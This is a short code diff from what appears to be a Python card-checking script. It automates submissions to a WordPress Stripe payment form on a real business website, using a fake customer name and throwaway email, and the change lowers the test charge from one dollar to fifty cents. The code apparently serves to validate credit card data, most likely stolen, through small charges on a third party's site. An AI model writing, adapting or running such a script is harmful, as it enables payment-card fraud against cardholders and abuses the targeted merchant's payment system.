@@ -63,7 +63,7 @@ def Tele(ccx):
 	    'x-requested-with': 'XMLHttpRequest',
 	}
 	
-	data = 'action=wpf_submit_form&form_id=462&payment_total=100&form_data=__wpf_form_id%3D462%26__wpf_current_url%3Dhttps%253A%252F%252Fserenemarine.ie%252Fpayments%26__wpf_current_page_id%3D453%26customer_name%3DRodam%2520User%26number%3D2085812225%26customer_email%3Dlajaro6411%2540matmayer.com%26custom_payment_input%3D1%26terms_conditions%255B%255D%3DAgreed%26__stripe_payment_method_id%3D'+str(pm)+''
+	data = 'action=wpf_submit_form&form_id=462&payment_total=50&form_data=__wpf_form_id%3D462%26__wpf_current_url%3Dhttps%253A%252F%252Fserenemarine.ie%252Fpayments%26__wpf_current_page_id%3D453%26customer_name%3DRodam%2520User%26number%3D2085812225%26customer_email%3Dlajaro6411%2540matmayer.com%26custom_payment_input%3D0.50%26terms_conditions%255B%255D%3DAgreed%26__stripe_payment_method_id%3D'+str(pm)+''
 	
 	r2 = requests.post('https://serenemarine.ie/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
 	
